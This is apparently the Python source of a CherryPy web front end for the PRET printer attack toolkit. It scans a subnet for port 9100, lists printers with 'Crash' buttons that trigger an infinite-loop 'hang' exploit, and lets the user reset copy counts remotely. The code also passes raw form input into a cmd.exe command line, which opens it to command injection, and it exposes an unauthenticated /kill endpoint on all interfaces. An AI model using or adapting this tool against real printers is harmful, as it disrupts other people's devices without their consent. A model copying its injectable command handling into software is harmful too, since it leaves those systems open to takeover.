import cherrypy
import subprocess
import os.path
import socket

head = '<head><title>PRET</title><link rel="stylesheet" type="text/css" href="static/webpretstyles.css"></head>'

class Page:
    @cherrypy.expose #remote kill switch by calling /kill url
    def kill(self):
        cherrypy.engine.exit()
        exit()
        return
    
    @cherrypy.expose
    def index(self):
        return  head + '''
                <body>
                <div id="main" class="body">
                <div id="processing"><h2>Processing...<br><br><br><br><br></h2></div>
                <div id="loader"></div>
                <div id="content">
                <h1>PRET Web Interface</h1>
                <hr>
                <form action="run" method="GET">
                <p>Printer hostname or IP address <input id="p1id" type="text" name="p1" placeholder="Scan to discover" /></p>
                <p>Set number of copies <input id="p2id" type="number" name="p2" placeholder="optional" /></p>
                <p>Infinite loop exploit <input id="p3id" type="checkbox" name="p3" /></p>
                <hr>
                <p><a href="javascript:run();">Submit</a><a href="javascript:loader('scan');">Scan Network</a></p>
                </form>
                </div>
                </div>
                <script>
                    function run() {
                        const p1 = document.getElementById("p1id").value;
                        const p2 = document.getElementById("p2id").value;
                        const p3 = document.getElementById("p3id").checked;
                        loader("run?p1=" + p1 + "&p2=" + p2 + "&p3=" + p3)
                    }
                    
                    function loader(href) {
                        document.getElementById("content").style.display = "none";
                        document.getElementById("processing").style.display = "block";
                        document.getElementById("loader").style.display = "block";
                        window.location=href;
                    }
                </script>
                </body>
                '''

    @cherrypy.expose
    def run(self, p1=None, p2=None, p3=None):
        if p1:
            target = p1
        else:
            target = ''
        if p2:
            count = 'config copies ' + str(p2)
        else:
            count = ''
        if p3 == 'true':
            hang = 'hang'
        else:
            hang = ''
        cmds = ['python pret.py -q ' + str(target) + ' ps', count, hang, 'exit']
        p = subprocess.Popen('cmd.exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        for cmd in cmds:
            p.stdin.write(cmd + "\n")
        p.stdin.close()
        output = ''
        for item in p.stdout.read().split('\n'):
            cleanup = item.split("PRET")
            cleanup.reverse()
            line = cleanup[0]
            output = output + '<p class="outputConsole">' + line + '</p>'
        return  head + '''
                <body>
                <div class="body">
                <h2>Console Output:</h2>
                <hr><br>
                <p>''' + output + '''</p>
                <br><hr>
                <p><a class="back" href="./">Done</a></p>
                </div>
                </body>
                '''

    @cherrypy.expose
    def scan(self):
        host_ips = []
        host_names = []
        #host_ips = ['192.168.11.44', '192.168.11.67', '192.168.11.68', '192.168.11.89', '192.168.11.91'] #for testing interface
        #host_names = ['epson', 'hp', 'canon', 'konica minolta', 'xerox'] #for testing interface
        def ipscan(start2,port):
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            try:
                s.connect((start2,port))
                host_ips.append(start2)
                try:
                    host_names.append(socket.gethostbyaddr(start2)[0])
                except:
                    host_names.append("Unknown")
            except:
                pass
        def iprange(start,end):
            while end>start:
               start[3]+=1
               ipscan('.'.join(map(str,start)),p)
               for i in (3,2,1,0):
                  if start[i]==255:
                     start[i-1]+=1
                     start[i]=0
            
        sta=map(int,'10.10.10.1'.split('.')) #hard coded ip range
        fin=map(int,'10.10.10.255'.split('.'))
        p=9100 #PRET port number
        iprange(sta,fin)      
        output = '<table id="scantable"><tr><th>Number</th><th>IP Address</th><th>Hostname</th><th>Functions</th></tr>'
        row_indicies = len(host_ips) - 1
        for i in range(row_indicies):
            output = output + '<tr><td>' + str(i + 1) + '</td><td>' + host_ips[i] + '</td><td>' + host_names[i] + '</td><td><button id="tablecrashbutton" type="button" name="crashButton" onclick="loader(\'run?p1=' + host_ips[i] + '&p3=true\')">Crash</button>     <button id="tablecopiesbutton" type="button" name="copiesButton" onclick="numCopies(\'' + host_ips[i] + '\')">Set Copies</button></td></tr>'
        output = output + '</table>'     
        return  head + '''
                <body>
                <div id="main" class="body">
                <div id="processing"><h2>Processing...<br><br><br><br><br></h2></div>
                <div id="loader"></div>
                <div id="content">
                <h2>Printers:</h2>
                <hr><br>
                ''' + output + '''
                <br><hr>
                <p><a class="back" href="./">Done</a></p>
                </div>
                </div>
                <script>
                    function numCopies(host) {
                        var copies = prompt("Set copy amount:", "1");
                        if (copies != null) {
                            loader(window.location='run?p1=' + host + '&p2=' + copies);
                        }
                    }
                    function loader(href) {
                        document.getElementById("content").style.display = "none";
                        document.getElementById("processing").style.display = "block";
                        document.getElementById("loader").style.display = "block";
                        window.location=href;
                    }
                </script>
                </body>
                '''
    
current_dir = os.path.dirname(os.path.abspath(__file__)) + os.path.sep

global_conf = {
       'global':    { 'server.environment': 'production',
                      'engine.autoreload_on': True,
                      'engine.autoreload_frequency': 5,
                      'server.socket_host': '0.0.0.0',
                      'server.socket_port': 1942, #configure port
                    },
            '/':{
                    'tools.staticdir.root' : current_dir,
            },
            '/static':{
                'tools.staticdir.on' : True,
                'tools.staticdir.dir' : 'static',
            },
       }


if __name__ == '__main__':
    cherrypy.quickstart(Page(), config=global_conf)
